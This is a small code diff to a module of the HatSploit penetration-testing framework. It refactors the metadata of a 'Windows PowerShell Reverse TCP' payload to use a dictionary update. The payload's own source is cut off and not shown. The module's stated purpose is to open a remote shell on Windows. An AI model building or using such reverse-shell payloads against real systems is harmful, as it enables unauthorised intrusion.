@@ -10,7 +10,7 @@ class HatSploitPayload(Payload, Handler):
     def __init__(self):
         super().__init__()
 
-        self.details = {
+        self.details.update({
             'Name': "Windows PowerShell Reverse TCP",
             'Payload': "windows/generic/powershell_reverse_tcp",
             'Authors': [
@@ -21,7 +21,7 @@ class HatSploitPayload(Payload, Handler):
             'Platform': "windows",
             'Rank': "high",
             'Type': "reverse_tcp",
-        }
+        })
 
     def run(self):
         source = (
